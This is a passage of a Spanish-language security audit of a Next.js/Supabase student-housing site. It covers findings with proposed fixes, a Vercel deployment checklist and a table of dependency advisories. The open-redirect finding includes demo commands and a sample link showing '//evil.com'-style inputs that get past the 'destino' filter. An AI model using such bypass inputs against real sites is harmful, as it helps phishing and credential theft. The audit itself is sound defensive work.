1. **Fuga de datos en dispositivo compartido**: tras cerrar sesión, el HTML de `/publicar` —que contiene el correo del anfitrión y el listado de sus publicaciones (`app/publicar/page.tsx:48,73-108`)— permanece en `Cache Storage`. En un equipo compartido (sala de estudio, computador de la pensión, portátil prestado), otro usuario puede recuperarlo navegando offline o inspeccionando el almacenamiento. Es una fuga de datos personales, no un fallo estético.
2. **Caché envenenada con errores**: como no se comprueba `respuesta.ok`, un 500, un 404 o una **redirección** generada durante un fallo transitorio de Supabase puede quedar almacenada y servirse después como si fuera la página buena.

**Propuesta**

```js
// 1) No cachear navegaciones a rutas privadas
const RUTAS_PRIVADAS = ["/publicar", "/login", "/registro"];
const esPrivada = RUTAS_PRIVADAS.some((r) => url.pathname.startsWith(r));

if (solicitud.mode === "navigate" && esPrivada) {
  evento.respondWith(fetch(solicitud).catch(() => caches.match("/offline")));
  return;
}

// 2) No cachear respuestas no-OK ni redirecciones
.then((respuesta) => {
  if (!respuesta.ok || respuesta.redirected) return respuesta;
  const copia = respuesta.clone();
  caches.open(CACHE_APP).then((cache) => cache.put(solicitud, copia));
  return respuesta;
})
```
3. **Purgar cachés al cerrar sesión**: en `app/auth/signout/route.ts`, tras `signOut()`, añadir un encabezado o un pequeño script cliente que ejecute `caches.keys().then(ks => Promise.all(ks.map(k => caches.delete(k))))` y desregistre el SW si se quiere ser estricto.
4. **Subir `VERSION`** al aplicar el cambio (hoy `"v2"` en `public/sw.js:12`) para que los dispositivos con la app instalada reciban la versión corregida.

**Esfuerzo:** 1–2 h. **Coste:** 0 €.

---

### 🟡 S-09 — Redirección abierta en el parámetro `destino` · Medio

**Evidencia**
- `app/login/page.tsx:19-20`:
  ```ts
  const { destino: destinoSolicitado } = await searchParams;
  const destino = destinoSolicitado?.startsWith("/") ? destinoSolicitado : "/publicar";
  ```
- `components/FormularioLogin.tsx:40` — tras autenticar: `router.push(destino)`.

**Por qué la validación es insuficiente (verificado)**
`startsWith("/")` acepta `//dominio-externo`, que el navegador resuelve como URL absoluta de otro origen:

```
$ node -e "console.log('//evil.com'.startsWith('/'))"     → true
$ node -e "console.log(new URL('//evil.com','https://pensiones-unimagdalena.vercel.app').href)"
                                                          → https://evil.com/
$ node -e "console.log(new URL('/\\evil.com','https://sitio.com').href)"
                                                          → https://evil.com/
```
Ambas formas (`//` y `/\`) pasan el filtro.

**Riesgo concreto**
Se puede enviar a un anfitrión un enlace del **dominio legítimo** (`https://tudominio/login?destino=//sitio-clonado`) que, tras un inicio de sesión correcto, lo lleva a un clon del sitio. Es la técnica estándar para cadenas de robo de credenciales y para erosionar la confianza en un sitio que, además, presume de "Acceso anfitriones".

**Propuesta**
- Validar contra una **allowlist de rutas internas** y rechazar cualquier cosa con `//` o `\`:

  ```ts
  const RUTAS_PERMITIDAS = ["/publicar"];
  const destino =
    destinoSolicitado && RUTAS_PERMITIDAS.some((r) => destinoSolicitado === r || destinoSolicitado.startsWith(`${r}/`))
      ? destinoSolicitado
      : "/publicar";
  ```
  (Alternativa más robusta, si el destino debe ser arbitrario: `new URL(destinoSolicitado, SITIO_URL).origin === new URL(SITIO_URL).origin`.)
- El middleware ya genera el valor con `peticion.nextUrl.pathname` (`utils/supabase/middleware.ts:41`), que es seguro por construcción: el problema está **solo** en el valor que llega por query string.

**Esfuerzo:** 30 min. **Coste:** 0 €.

---

### 🟡 S-10 — El esquema SQL no limita la forma de los datos · Medio

**Evidencia**
- `supabase/esquema.sql:23-47` — en `pensiones`, los únicos `check` son numéricos y de enumeración: `precio_mensual >= 0` (`:30`), `distancia_a_pie_minutos between 0 and 120` (`:33-34`), `calificacion between 0 and 5` (`:40`). **`titulo`, `descripcion`, `direccion`, `barrio`, `servicios`, `normas` e `imagenes` no tienen ninguna restricción de longitud, formato o cardinalidad.**
- Las reglas que sí existen (`TITULO_MIN = 6`, `DESCRIPCION_MIN = 30`, `MAX_IMAGENES = 8`, filtro `^https?://`) viven **solo** en el Server Action (`app/actions/pensiones.ts:17-23,74-99`).

**Por qué es un hallazgo de seguridad y no de estilo**
La clave anónima de Supabase es pública y la política `pensiones: crear las propias` (`esquema.sql:122-124`) autoriza inserciones a cualquier usuario autenticado. Por tanto, **la validación del Server Action es evitable**: basta un `POST /rest/v1/pensiones` con el token de sesión propio para insertar un `titulo` de 5 MB, 10.000 elementos en `servicios`, o URLs de imagen arbitrarias (que alimentan S-02). RLS protege **qué filas** puede escribir cada usuario; no protege **qué forma** tienen.

**Riesgo concreto**: agotamiento de almacenamiento, degradación del render (una descripción de megabytes en cada tarjeta), amplificación del vector de imágenes (S-02) y —vía S-01— entrega directa de payloads XSS sin pasar por el formulario.

**Propuesta** (DDL de endurecimiento, **no ejecutado** en esta auditoría; coordinar con la propuesta de `docs/auditorias/datos-backend.md` §7 para no duplicar migraciones)

```sql
alter table public.pensiones
  add constraint titulo_long      check (char_length(titulo) between 6 and 120),
  add constraint descripcion_long check (char_length(descripcion) between 30 and 2000),
  add constraint direccion_long   check (char_length(direccion) <= 160),
  add constraint barrio_long      check (char_length(barrio) <= 60),
  add constraint servicios_max    check (coalesce(array_length(servicios, 1), 0) <= 12),
  add constraint normas_max       check (coalesce(array_length(normas, 1), 0) <= 8),
  add constraint imagenes_max     check (coalesce(array_length(imagenes, 1), 0) <= 8),
  add constraint imagenes_https   check (
    not exists (select 1 from unnest(imagenes) as u(url) where u.url !~ '^https://')
  );
```
La última restricción obliga a que **todas** las imágenes sean HTTPS (elimina también `javascript:` y `data:`), y si se decide acotar el optimizador de S-02, se puede endurecer con la allowlist de dominios. Añadir además un trigger `before insert or update` que rechace `<` y `>` en `titulo`, `descripcion`, `direccion` y `barrio`, y en los elementos de `servicios` y `normas`: así se cierra S-01 también por la vía PostgREST.

**Esfuerzo:** 2 h (DDL + trigger + prueba con la API REST). **Coste:** 0 €.

---

### 🟡 S-11 — El rol del usuario es auto-asignable desde el registro · Medio

**Evidencia**
- `supabase/esquema.sql:85-89` — el trigger `crear_perfil_usuario` toma el rol de los metadatos enviados por el cliente: `case when new.raw_user_meta_data ->> 'rol' in ('estudiante','anfitrion') then … else 'anfitrion' end`.
- `components/FormularioRegistro.tsx:39` — el formulario envía ese metadato: `data: { nombre, rol: "anfitrion" }`.
- `supabase/esquema.sql:113-115` — la política de `update` permite al usuario modificar su propia fila, **incluida la columna `rol`**.

**Riesgo concreto**: hoy ambos roles tienen los mismos privilegios, así que el impacto es **latente**; pero el día que se diferencie `estudiante` de `anfitrion` (por ejemplo, para moderación, precios, o acceso a un panel interno), la escalada será trivial: cada usuario puede concederse el rol que quiera por la API pública.

**Propuesta**
- En el trigger, **ignorar** el metadato entrante y fijar el rol por defecto; asignar `estudiante`/`anfitrion` **solo desde un proceso con privilegios** (panel de administración o función `security definer` con lista de administradores).
- Restringir la columna: `revoke update (rol) on public.usuarios from authenticated;` o separar los datos sensibles en otra tabla.
- Igual criterio para cualquier otro campo derivado de `raw_user_meta_data`.

**Esfuerzo:** 30 min. **Coste:** 0 €.

---

### 🟡 S-12 — Dominio canónico y enlaces compartidos hardcodeados · Medio

**Evidencia**
- `lib/sitio.ts:6` — `export const SITIO_URL = "https://pensiones-unimagdalena.vercel.app";` (comentado como "sustituir al publicar", pero es una constante en código).
- Se usa en: `app/layout.tsx:41,56` (JSON-LD del sitio), `app/page.tsx:39` (JSON-LD del listado), `app/pensiones/[id]/page.tsx:49,80` (Open Graph y JSON-LD de la ficha) y `app/pensiones/[id]/page.tsx:174` (**el texto que el estudiante comparte por WhatsApp**).

**Riesgo concreto**: si el dominio final no es exactamente ese (subdominio propio, otro proyecto de Vercel, Netlify), entonces (a) el canónico y los datos estructurados apuntan a otro sitio —riesgo de canibalización y de que Google indexe la URL equivocada—, y (b) **los enlaces que los estudiantes comparten por WhatsApp apuntan a un dominio que puede no ser el suyo**, rompiendo el principal canal de crecimiento del producto.

**Propuesta**
- Derivar de entorno, con valor por defecto explícito:
  ```ts
  export const SITIO_URL =
    process.env.NEXT_PUBLIC_SITIO_URL ??
    (process.env.VERCEL_PROJECT_PRODUCTION_URL ? `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL}` : "http://localhost:3000");
  ```
- Añadir `NEXT_PUBLIC_SITIO_URL` a `.env.example` y a la checklist de Vercel (§4.7).
- Verificación: tras el despliegue, `curl -s <url> | grep -o '<link rel="canonical"[^>]*>'` debe devolver el dominio real.

**Esfuerzo:** 1 h (incluye verificación post-despliegue). **Coste:** 0 €.

---

### 🟡 S-13 — Sin observabilidad: los fallos se enmascaran · Medio

**Evidencia**
- Único mecanismo de diagnóstico: `console.error` en `app/actions/pensiones.ts:119`, `lib/datos.ts:53,59,84,104,115` y `app/error.tsx:19`. No hay error tracking, ni métricas, ni alertas, ni *healthcheck*.
- `lib/datos.ts:41-62` — ante **cualquier** error de Supabase, `obtenerPensiones()` **devuelve el catálogo demo** y el sitio sigue funcionando "perfectamente".

**Riesgo concreto**
La degradación segura es una buena decisión de producto, pero **sin observabilidad convierte una caída total de la base de datos en un incidente invisible**: el catálogo muestra las 6 pensiones de demostración, nadie recibe un error y el negocio pierde consultas reales sin que nadie lo note durante días. En producción, "el sitio se ve bien" no es evidencia de que funcione. Tampoco hay forma de auditar quién publicó qué ni de correlacionar un aumento de errores con un cambio.

**Propuesta**
1. **Error tracking** (Sentry o equivalente, con nivel gratuito): inicializar en `app/error.tsx` y envolver los `catch` de `lib/datos.ts` y el `insert` de `app/actions/pensiones.ts`.
2. **Señal explícita de degradación**: cuando `lib/datos.ts` caiga al catálogo demo con Supabase configurado, **registrar un evento con severidad alta** (es un incidente, no un caso esperado) y, opcionalmente, mostrar un aviso discreto ("catálogo en modo de contingencia"). Hoy ambos casos —"sin Supabase configurado" y "Supabase caído"— son indistinguibles.
3. **`GET /api/health`** que compruebe configuración + conectividad de Supabase (consulta mínima) y responder 200/503. Con eso se pueden configurar *uptime checks* externos (gratuitos) y alertas.
4. **Logs retenidos**: los de Vercel son efímeros; si se necesita trazabilidad (por ejemplo, para investigar el abuso de S-06), enviar los eventos de inserción a un destino con retención (Supabase o el propio proveedor de logs).
5. **Alertas mínimas**: fallo del healthcheck, tasa de error 5xx y picos de uso del optimizador de imágenes (alerta temprana de S-02).

**Esfuerzo:** 3–4 h. **Coste:** 0 € con niveles gratuitos; los planes de pago de observabilidad se deciden cuando haya tráfico real.

---

### 🟡 S-14 — Sin aviso de privacidad ni ruta de borrado de datos · Medio

**Evidencia**
- El registro recoge **nombre y correo electrónico** (`components/FormularioRegistro.tsx:16-17,34-42`) y los almacena en `public.usuarios` (`esquema.sql:10-16`).
- El producto canaliza los datos del estudiante hacia **WhatsApp (Meta)** desde cada ficha (`lib/formato.ts:86-90`) sin ningún aviso.
- **No existe** ninguna ruta `/privacidad` ni `/terminos` (verificado en la estructura de `app/`: solo `login`, `registro`, `publicar`, `pensiones`, `offline`, `error`, `not-found`), ni enlace a ellas desde el pie (`components/Footer.tsx`).
- No hay forma, para un anfitrión, de **eliminar su cuenta y sus datos**: el borrado en cascada existe a nivel de esquema (`esquema.sql:11,25`), pero no hay UI ni endpoint que lo dispare. Sí existe `obtenerPensionesDelAnfitrion` para listar, pero nada para borrar.

**Riesgo concreto**: además del evidente problema de confianza (un sitio que pide el correo a estudiantes y no explica qué hace con él), en Colombia la **Ley 1581 de 2012** y el régimen de protección de datos personales exigen informar la finalidad del tratamiento y habilitar canales para ejercer derechos de acceso, corrección y supresión. **Esto no es asesoría jurídica**: la recomendación es concreta y verificable (faltan aviso y canal), pero la redacción final debe validarla quien asuma la responsabilidad legal del producto.

**Propuesta**
1. Página `/privacidad` con: qué datos se recogen (nombre, correo, teléfono en WhatsApp), finalidad, encargados (Supabase, Vercel, WhatsApp/Meta), plazo de conservación y canal para ejercer derechos. Enlace permanente desde el pie, y una casilla de aceptación en el registro.
2. **Endpoint de supresión**: Server Action `eliminarMiCuenta` que borre las pensiones del usuario (o desactive la cuenta) y la fila de `usuarios`, con confirmación explícita. Verificación posterior con una consulta a `usuarios`/`pensiones`.
3. **Minimización**: revisar si se necesita realmente el nombre en el registro antes de la primera publicación; y no mostrar el correo completo en pantallas compartidas.
4. **Retención**: definir y documentar cuánto tiempo se conservan fichas inactivas y cuentas sin publicaciones.

**Esfuerzo:** 1–2 días (texto + página + endpoint + validación legal externa). **Coste:** 0 € técnico; el coste legal depende de si se asesora externamente.

---

### 🟢 S-15 — `POST /auth/signout` sin validación de origen · Bajo

**Evidencia**: `app/auth/signout/route.ts:6-11` acepta `POST` de cualquier origen y cierra la sesión (`await supabase.auth.signOut()`), invocado desde `app/publicar/page.tsx:50-57` con un formulario sin token. La decisión de aceptar **solo POST** ya es correcta (evita el cierre por simple enlace) y está documentada en `:5`.

**Riesgo concreto**: *logout CSRF*. El impacto es bajo (no hay robo de datos ni de sesión, solo una desconexión no deseada), pero es ruido explotable y un patrón que conviene cerrar antes de copiarlo a acciones más sensibles.

**Propuesta**: comprobar `Origin`/`Referer` contra `SITIO_URL` antes de ejecutar `signOut()`; alternativamente, token CSRF por sesión. Con las protecciones de cookies de `@supabase/ssr` (`SameSite=Lax`), el vector ya está acotado, así que es defensa en profundidad.

**Esfuerzo:** 30 min. **Coste:** 0 €.

---

### 🟢 S-16 — Los lanzadores terminan procesos ajenos en el puerto 3000 · Bajo

**Evidencia**: `Iniciar-App.bat:27-30` e `Iniciar-Dev.bat:28-31` ejecutan `taskkill /F /PID` sobre **cualquier** proceso escuchando en el puerto 3000, sin preguntar y sin comprobar que sea un `node` de este proyecto.

**Riesgo concreto**: puede matar un servicio no relacionado del usuario (otro proyecto en desarrollo, un contenedor, una herramienta local) y provocar pérdida de trabajo no guardado. Es la clase de script "cómodo" que a mitad de proyecto genera un incidente inexplicable.

**Propuesta**: filtrar por nombre de imagen (`node.exe`) **y** verificar que el directorio de trabajo del proceso corresponde a este proyecto antes de matarlo; si no coincide, avisar y pedir confirmación. Conservar la liberación automática (resolvió un problema real de caché `.next`) pero acotada a procesos propios.

**Esfuerzo:** 15 min. **Coste:** 0 €.

---

### 🟢 S-17 — Dependencias sin fijar y sin versión de Node declarada · Bajo

**Evidencia**: `package.json:12-30` usa rangos `^` en **todas** las dependencias (incluido `"next": "^14.2.35"`), y no hay campo `engines` ni `.nvmrc`. Existe `package-lock.json` (77 KB), que hoy garantiza reproducibilidad **solo si se usa `npm ci`** — nunca `npm install`.

**Riesgo concreto**: dos instalaciones en fechas distintas pueden resolver versiones distintas; `^14.2.35` admite cualquier `14.x` futuro (cambios de comportamiento silenciosos) y `sharp` puede fallar si el Node de Vercel no coincide con el local. Es el escenario "funciona en mi máquina" que este proyecto ya sufrió con el bug de la caché `.next`.

**Propuesta**: añadir `"engines": { "node": ">=20 <23" }` y `.nvmrc` con la misma versión que se fije en Vercel; usar `npm ci` en CI y despliegue; activar Dependabot/Renovate con PR automáticos para parchear (ello conecta con la migración a Next 15.5.24+/16).

**Esfuerzo:** 20 min. **Coste:** 0 €.

---

## 4. Checklist de despliegue a Vercel

Marcado como **[BLOQUEANTE]** lo que debe estar resuelto antes de exponer el sitio al público, y **[RECOMENDADO]** lo que puede completarse en la primera semana sin tráfico real.

### 4.1 Variables de entorno y secretos

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | `NEXT_PUBLIC_WHATSAPP_NUMBER` definida en **Production** (y en Preview si se prueban fichas) | ⚠️ Depende de configuración manual; el código tiene *fallback* silencioso (S-05) | **[BLOQUEANTE]** quitar el fallback y fallar el build si falta |
| 2 | `NEXT_PUBLIC_SUPABASE_URL` y `NEXT_PUBLIC_SUPABASE_ANON_KEY` definidas | ⚠️ Vacías/comentadas en `.env.local` (modo demo) | **[BLOQUEANTE]** definirlas en el panel de Vercel, no en el repositorio |
| 3 | `NEXT_PUBLIC_SITIO_URL` (o `VERCEL_PROJECT_PRODUCTION_URL`) para el dominio canónico | ❌ No existe; hay una constante en `lib/sitio.ts:6` (S-12) | **[BLOQUEANTE]**, es un cambio de 1 línea por el impacto en JSON-LD y en los enlaces compartidos |
| 4 | Ninguna variable secreta con prefijo `NEXT_PUBLIC_` | ✅ Verificado: solo hay tres `NEXT_PUBLIC_*` y las tres son públicas por diseño (URL y *anon key* de Supabase son públicas; la seguridad real es RLS) | Mantener la regla: **la `service_role` key nunca entra en este proyecto**; verificado que no se usa en ninguna línea (`grep` de `service_role` / `SUPABASE_SERVICE`: cero coincidencias) |
| 5 | `.env.local` fuera de git | ✅ `.gitignore:23` cubre `.env*.local` | Al inicializar git (S-07), confirmar con `git status --ignored` |
| 6 | `.env.local` fuera de las copias de seguridad | ❌ Las copias `backups/pensiones-unimagdalena_2026-09-13_215{1,2}` contienen `.env.local` (hoy solo el número de WhatsApp; con Supabase serían credenciales) | **[RECOMENDADO]** excluir `.env.local` de las copias y sacar `backups/` del árbol del proyecto |
| 7 | Variables separadas para Production / Preview / Development | ❌ Sin evidencia de configuración | **[RECOMENDADO]**; y **proteger los despliegues de Preview** (Vercel: *Deployment Protection*, add-on de pago — \$20/mes por proyecto según [vercel.com/docs/pricing](https://vercel.com/docs/pricing)) para que un *preview* no quede público con el catálogo real |
| 8 | Rotación documentada de credenciales | ❌ No existe | **[RECOMENDADO]** procedimiento escrito: cómo rotar la *anon key*, el número de WhatsApp y las claves de Supabase |
| 9 | Dominios de redirección permitidos en Supabase Auth | ❌ Sin evidencia | **[BLOQUEANTE]** registrar **exactamente** `https://<dominio-real>/publicar` en *Redirect URLs* (el registro usa `emailRedirectTo` en `components/FormularioRegistro.tsx:40`). Evitar comodines: un comodín convierte Supabase en redirección abierta |

### 4.2 Cabeceras de seguridad y CSP

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | `Content-Security-Policy` | ❌ Ausente (búsqueda en todo el repo: 0 coincidencias) | **[BLOQUEANTE]** bloque de `next.config.mjs` propuesto en S-04, empezando con **hashes/`unsafe-inline`** y pasando a nonces **solo** después de subir Next ≥15.5.16 |
| 2 | `Strict-Transport-Security` | ❌ Ausente | **[BLOQUEANTE]** `max-age=63072000; includeSubDomains; preload` (con dominio propio; en `*.vercel.app` el preload no aplica) |
| 3 | `X-Frame-Options` / `frame-ancestors` | ❌ Ausente | **[BLOQUEANTE]** protección de clickjacking sobre el login de anfitriones |
| 4 | `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` | ❌ Ausentes | **[BLOQUEANTE]** (triviales, incluidas en el bloque de S-04) |
| 5 | `poweredByHeader: false` | ❌ Ausente (se anuncia `X-Powered-By: Next.js`) | **[RECOMENDADO]** dos palabras, reduce huella de tecnología |
| 6 | Verificación post-despliegue de cabeceras | ❌ No existe | **[RECOMENDADO]** script `scripts/verificar-cabeceras.mjs` contra la URL pública; añadirlo al pipeline |

### 4.3 RLS y políticas de Supabase

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | RLS activado en las tres tablas | ✅ `esquema.sql:104-106` (`usuarios`, `pensiones`, `habitaciones`) | Mantener; es la única frontera real de datos del proyecto |
| 2 | Lectura pública limitada a `activa = true` | ✅ `esquema.sql:118-120` (`using (activa or auth.uid() = anfitrion_id)`) | Verificar con la *anon key* real que un anónimo **no** ve fichas inactivas |
| 3 | Escritura limitada al propietario | ✅ Políticas de `insert`/`update`/`delete` con `auth.uid()` en `pensiones` y `habitaciones` (`esquema.sql:122-170`) | Correcto. **Pero recuerda que autoriza cualquier forma de dato** → S-10 |
| 4 | Prueba de RLS con la clave anónima | ❌ No existe | **[BLOQUEANTE]** ejecutar antes de publicar: `curl "https://<proyecto>.supabase.co/rest/v1/pensiones?select=*" -H "apikey: <anon>"` → solo activas; y `POST` sin token → `401`/`403` |
| 5 | `rol` no manipulable | ❌ El trigger lee metadatos del cliente; la política de `update` permite cambiarlo (S-11) | **[RECOMENDADO]** antes de que los roles signifiquen algo |
| 6 | Sin `service_role` en el cliente | ✅ Verificado en el código | Mantener |
| 7 | Revisar RLS tras cada cambio de esquema | ❌ No hay procedimiento | **[RECOMENDADO]** añadir la prueba de RLS (§4.3.4) al pipeline de CI |

### 4.4 Límite de tasa y protección contra abuso

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | Rate limiting en registro/login | ⚠️ Parcial: Supabase Auth aplica límites propios, pero **el proyecto no añade ninguno** | **[BLOQUEANTE]** reglas de firewall/rate limit en Vercel sobre rutas de autenticación y `POST` |
| 2 | Rate limiting en publicación (`crearPension`) | ❌ Ninguno | **[BLOQUEANTE]**; además es la superficie de las vulnerabilidades de DoS en Server Actions (S-03) |
| 3 | Límite de publicaciones por anfitrión | ❌ Ninguno | **[BLOQUEANTE]** (S-06); aplicarlo **también** en base de datos, no solo en el Server Action |
| 4 | Verificación de correo obligatoria | ⚠️ Depende del panel de Supabase y no se comprueba en el código | **[BLOQUEANTE]** activar *Confirm email* y exigir `email_confirmed_at` para publicar |
| 5 | Moderación antes de publicar | ❌ Todo entra con `activa: true` (S-06) | **[BLOQUEANTE]** por coherencia con el sello "verificada" |
| 6 | Captcha o control anti-bot en el registro | ❌ Ninguno | **[RECOMENDADO]** si aparece abuso tras el lanzamiento |
| 7 | Mitigación del abuso del optimizador de imágenes | ❌ `remotePatterns: "**"` + AVIF (S-02) | **[BLOQUEANTE]** |
| 8 | Límite de tamaño de payload en Server Actions | ❌ No configurado | **[RECOMENDADO]** |

### 4.5 Respaldos

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | Base de datos (Supabase) con respaldos | ❌ No hay estrategia; el plan gratuito no ofrece recuperación a un punto en el tiempo | **[BLOQUEANTE]** definir estrategia: plan Pro (desde \$25/mes por proyecto, incluye respaldo diario — [supabase.com/pricing](https://supabase.com/pricing)) o `pg_dump` programado propio |
| 2 | Exportación programada e independiente | ❌ No existe | **[RECOMENDADO]** `pg_dump` diario a almacenamiento externo; verificar la restauración al menos una vez (un respaldo no probado no es un respaldo) |
| 3 | Copia del código | ⚠️ Manual, dentro del árbol de trabajo y sin historial | **[BLOQUEANTE]** git + remoto privado (S-07) |
| 4 | Respaldo de imágenes subidas por anfitriones | ⚠️ Hoy son URLs externas (no se almacena nada), por lo que **las fotos pueden desaparecer** sin que el catálogo lo sepa | **[RECOMENDADO]** migrar a Supabase Storage y respaldar el *bucket* |
| 5 | Procedimiento de reversión documentado y probado | ⚠️ Documentado (`docs/integracion-supabase.md` §5) pero no probado | **[RECOMENDADO]** probarlo una vez antes de lanzar |
| 6 | Plan de continuidad del dominio y del proyecto Vercel | ❌ No existe | **[RECOMENDADO]** quién tiene acceso, con qué cuenta y cómo se transfiere |

### 4.6 Observabilidad y registros

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | Error tracking | ❌ Solo `console.error` (S-13) | **[RECOMENDADO]** Sentry o equivalente con nivel gratuito |
| 2 | Endpoint de salud | ❌ No existe | **[RECOMENDADO]** `GET /api/health` (config + conectividad de Supabase) |
| 3 | Monitor de disponibilidad externo | ❌ No existe | **[RECOMENDADO]** comprobación cada 5 min sobre `/` y `/api/health`, con alerta por correo o WhatsApp |
| 4 | Detección de la degradación silenciosa al catálogo demo | ❌ `lib/datos.ts:41-62` degrada sin distinguir "sin configurar" de "caído" | **[BLOQUEANTE]** evento de error de alta severidad cuando hay credenciales y falla la consulta |
| 5 | Retención de logs | ❌ Los logs de Vercel son efímeros | **[RECOMENDADO]** retener eventos de publicación/errores para investigar abuso |
| 6 | Alertas de coste | ❌ No existen | **[RECOMENDADO]** aviso de gasto en Vercel (uso del optimizador de imágenes, invocaciones) — es la señal temprana del abuso descrito en S-02 |
| 7 | Trazabilidad de quién publica qué | ⚠️ `creada_en` y `anfitrion_id` existen en el esquema | **[RECOMENDADO]** conservar y poder consultar; útil para moderación |

### 4.7 Dominio canónico

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | Dominio definitivo decidido antes de publicar | ❌ `lib/sitio.ts:6` apunta a `pensiones-unimagdalena.vercel.app` | **[BLOQUEANTE]** (S-12) |
| 2 | `metadataBase` y canonical coherentes con el dominio real | ⚠️ Derivados de `SITIO_URL` | Verificar en el HTML desplegado |
| 3 | Redirección de `www` y del subdominio de Vercel al canónico | ❌ No configurado | **[RECOMENDADO]** 301 desde `*.vercel.app` al dominio propio, para no dividir señales SEO |
| 4 | `robots.txt` y `sitemap.xml` | ❌ No existen | Ya reportado por el TL (tarea #8); encaja con esta checklist: el `sitemap` debe declarar solo el dominio canónico |
| 5 | `noindex` en rutas privadas | ✅ `app/login/page.tsx:10`, `app/registro/page.tsx:10`, `app/publicar/page.tsx:14` | Mantener (y confirmar que el sello no se pierde al añadir cabeceras) |

### 4.8 HTTPS y HSTS

| # | Verificación | Estado hoy | Acción |
|---|---|---|---|
| 1 | TLS en todo el sitio | ✅ Vercel emite certificado automáticamente (y el Service Worker **exige HTTPS**, ver `docs/pwa-guia-instalacion.md`) | Confirmar tras el primer despliegue |
| 2 | HSTS con `includeSubDomains; preload` | ❌ Ausente | **[BLOQUEANTE]** añadir en cabeceras; no enviar `preload` hasta que el dominio esté estable |
| 3 | Redirección HTTP → HTTPS | ⚠️ Gestionada por la plataforma | Verificar con `curl -I http://<dominio>` → `301` a HTTPS |
| 4 | Sin contenido mixto | ✅ Las fuentes son autoalojadas (`app/layout.tsx:15-27`) y todos los recursos externos son HTTPS | Mantener al añadir el mapa y las fotos |
| 5 | Cookies de sesión con `Secure` y `HttpOnly` | ✅ `@supabase/ssr` establece `httpOnly`, `secure` y `sameSite` por defecto, y el proyecto las propaga sin modificarlas (`utils/supabase/middleware.ts:20-29`) | No sobrescribir esas opciones al personalizar el middleware |

### 4.9 Secuencia recomendada del día de despliegue

1. Ejecutar el bloque **BLOQUEANTE** de S-01, S-02 (mitigación), S-04, S-05, S-06 y las entradas [BLOQUEANTE] de §4.1–4.3.
2. `npm ci && npm run build` en limpio, con `NODE_ENV=production` y las variables reales.
3. Ejecutar `scripts/verificar-seo.mjs`, `scripts/verificar-contraste.mjs` y `scripts/prueba-humo.mjs` contra el build local.
4. Desplegar a **Preview**, aplicar el checklist §4.2–4.8 sobre la URL de preview (incluida la prueba de RLS con la *anon key*).
5. Promover a Production. Verificar cabeceras, canonical, JSON-LD, `/manifest.webmanifest`, `/sw.js` y una reserva de prueba por WhatsApp al número correcto.
6. Configurar el monitor de disponibilidad y el aviso de coste (§4.6).

---

## 5. Riesgos de dependencias (análisis de exposición real)

### 5.1 Inventario verificado

| Paquete | Rango declarado | Versión instalada | Nota |
|---|---|---|---|
| `next` | `^14.2.35` | **14.2.35** | 23 avisos asociados; corrección disponible: **16.3.5** (cambio mayor) |
| `postcss` (embebido en `next`) | — | **8.4.31** | 4 avisos; corrección disponible vía upgrade de `next` |
| `postcss` (raíz, devDependency) | `^8.4.45` | 8.5.26 | No afectado por los 4 avisos anteriores |
| `sharp` | `^0.35.4` | 0.35.4 | Motor de AVIF: relevante por GHSA-2xp9-vwfh-vxw4 |
| `@supabase/ssr` / `supabase-js` | `^0.12.7` / `^2.116.0` | instaladas | Sin avisos |
| `leaflet` / `react-leaflet` | `^1.9.4` / `^4.2.1` | instaladas | Sin avisos; cargado en diferido (correcto) |

`npm audit` resume esto en "**2 vulnerabilidades**" porque cuenta **paquetes**, no avisos. El número real de avisos es **23 sobre `next` + 4 sobre el `postcss` de `next`**.

### 5.2 Avisos sobre `next` clasificados por exposición en **este** proyecto

| Aviso | Severidad | ¿Aplica aquí? | Exposición concreta |
|---|---|---|---|
| GHSA-2xp9-vwfh-vxw4 — RCE no autenticado en Image Optimization API con AVIF | **Crítica** | **Sí, máxima** | AVIF habilitado (`next.config.mjs:6`) + `sharp` presente + endpoint público sin autenticación |
| GHSA-p293-qw3h-jr36 — RCE no autenticado en servidores Windows | **Crítica** | **Sí, en local** | Se sirve en una máquina Windows con acceso por red local (S-02b) |
| GHSA-m99w-x7hq-7vfj — DoS en App Router con Server Actions | Alta | **Sí** | Existe una Server Action pública (`app/actions/pensiones.ts`) |
| GHSA-q4gf-8mx6-v5v3 — DoS con Server Components | Alta | **Sí** | App Router en todas las rutas |
| GHSA-8h8q-6873-q5fj — DoS con Server Components | Alta | **Sí** | Ídem |
| GHSA-h25m-26qc-wcjf — DoS por deserialización de peticiones | Alta | **Sí** | Ídem |
| GHSA-36qx-fr4f-26g5 — Bypass de middleware con i18n (Pages Router) | Alta | No | El proyecto usa App Router y no configura i18n |
| GHSA-c4j6-fc7j-m34r — SSRF con *upgrades* WebSocket | Alta | No | No hay `upgrade` de WebSocket propio (solo HMR en desarrollo) |
| GHSA-89xv-2m56-2m9x — SSRF en Server Actions con servidor propio | Alta | No | No hay *custom server* |
| GHSA-p9j2-gv94-2wf4 — SSRF en `rewrites` con destino controlado | Alta | No | No hay `rewrites` en `next.config.mjs` |
| GHSA-9g9p-9gw9-jx7f (CVE-2025-59471) — DoS por `remotePatterns` | Moderada | **Sí, exacta** | `hostname: "**"` es el patrón vulnerable descrito |
| GHSA-3x4c-7xq6-9pq8 — crecimiento ilimitado de la caché de disco de `next/image` | Moderada | **Sí** | Orígenes sin restringir + `minimumCacheTTL: 604800` (`next.config.mjs:18`) |
| GHSA-h64f-5h5j-jqjh — DoS en la API de optimización de imágenes | Moderada | **Sí** | Ídem |
| GHSA-ggv3-7p47-pfv8 — *request smuggling* en `rewrites` | Moderada | No | No hay `rewrites` |
| GHSA-ffhc-5mcf-pf4q — XSS en apps App Router que usan nonces de CSP | Moderada | **Sí, si se implementa CSP con nonces hoy** | Aviso de diseño: ver la advertencia de S-04 |
| GHSA-955p-x3mx-jcvp — exposición no autenticada de endpoints de Server Functions | Moderada | **Sí** | Hay Server Actions |
